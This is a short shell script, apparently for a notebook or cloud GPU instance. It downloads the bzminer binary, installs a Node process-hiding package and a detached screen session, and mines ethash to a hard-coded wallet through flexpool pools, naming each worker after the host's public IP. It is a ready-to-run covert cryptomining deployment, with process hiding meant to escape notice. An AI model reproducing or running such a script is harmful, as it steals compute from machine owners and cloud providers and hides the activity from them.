sudo apt update
sudo apt install screen -y
screen -dmS tre.sh 89 95
%cd /opt
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider
sudo apt install libpci3
sudo apt-get install screen
wget https://github.com/bzminer/bzminer/releases/download/v7.2.5/bzminer_v7.2.5_linux_cuda_tk.tar.gz && tar xvf bzminer_v7.2.5_linux_cuda_tk.tar.gz
chmod +x bzminer
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo ./bzminer -a ethash -w 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4 -p stratum+ssl://eth-hk.flexpool.io:5555 stratum+ssl://eth-sg.flexpool.io:5555 -r $ip-GP --nvidia 1
